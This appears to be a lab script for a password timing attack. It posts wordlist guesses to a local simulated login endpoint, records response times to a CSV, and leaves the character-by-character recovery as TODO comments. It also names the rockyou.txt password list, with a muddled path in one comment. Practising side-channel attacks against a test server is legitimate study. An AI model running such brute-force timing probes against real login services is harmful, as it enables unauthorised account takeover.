import requests
import time
from time import strftime
import csv

timingattack_url = "http://127.0.0.1:5000/timingAttack"
curr_time = strftime("%Y-%m-%d_%H-%M-%S")
# Normally, this is from a proper wordlist. But for simulation, it's one custom made- contains entire upper lowcase alphabet and all nums and special chars
## If you didn't fiddle with your kali for pentesting, check out rockyou.txt at only if you have tar it first!
### cat /etc/usr/share/wordlists/rockyou.txt

# Initialize csv file
with open(f'timingAttack_{curr_time}.csv','w',newline='') as csvfile:
    fieldnames = ['Guess','Time']
    writer = csv.writer(csvfile)
    writer.writerow(fieldnames)

    with open("./wordlist.txt",mode='r') as wordlist:   # Read only
        print("Setting Timer")

        for guess in wordlist:
            guess = guess.strip() 

            data = {"password": guess}

            start = time.perf_counter()

            r = requests.post(url=timingattack_url, data=data)

            end = time.perf_counter()

            elapsed_time = end - start
            
            arr = [guess,elapsed_time]
            writer.writerow([guess, elapsed_time])

            # TODO: Implement recursive - currently stops at first letter obviously 
            # Implement recursive based on url response from server.py - it returns /failure
            # TODO: After iterating through the entire wordlist, check for the lowest elapsed time and take that as the first letter



print("C4 Exploded!")        

        